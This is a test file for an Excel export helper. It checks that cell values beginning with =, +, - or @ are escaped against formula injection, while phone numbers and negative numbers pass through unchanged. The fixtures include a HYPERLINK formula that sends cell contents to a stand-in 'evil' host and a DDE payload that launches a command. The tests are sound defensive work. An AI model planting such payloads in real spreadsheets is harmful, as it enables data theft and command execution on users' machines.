import { describe, it, expect } from 'vitest';
import { buildWorkbook, parseWorkbook } from '@/lib/excel';

describe('lib/excel — formula injection escape (QA-021)', () => {
  it('escapes leading = + - @ in cell values when building a workbook', async () => {
    const wb = await buildWorkbook(
      [
        { name: '=HYPERLINK("http://evil/?x="&A1)' },
        { name: '+1+2' },
        { name: "-2+3+cmd|' /C calc'!A0" },
        { name: '@SUM(A1:A2)' },
        { name: 'Normal Shop Name' },
      ],
      'Test'
    );
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const sheets = await parseWorkbook(buf);
    const cells = sheets[0].rows.map((r) => r['name']);
    expect(cells[0]).toBe(`'=HYPERLINK("http://evil/?x="&A1)`);
    expect(cells[1]).toBe(`'+1+2`);
    expect(cells[2]).toBe(`'-2+3+cmd|' /C calc'!A0`);
    expect(cells[3]).toBe(`'@SUM(A1:A2)`);
    expect(cells[4]).toBe(`Normal Shop Name`); // unchanged
  });

  it('leaves sign-prefixed numerics alone — phones and negatives are not formulas (go-live 2026-09-10)', async () => {
    const wb = await buildWorkbook(
      [
        { v: '+96898765432' },
        { v: '+968 9876 5432' },
        { v: '+968-9876-5432' },
        { v: '-1' },
        { v: '-12.5' },
        { v: '+(968) 24 123456' },
      ],
      'Test'
    );
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const sheets = await parseWorkbook(buf);
    const cells = sheets[0].rows.map((r) => r['v']);
    expect(cells).toEqual([
      '+96898765432',
      '+968 9876 5432',
      '+968-9876-5432',
      '-1',
      '-12.5',
      '+(968) 24 123456',
    ]);
  });
});
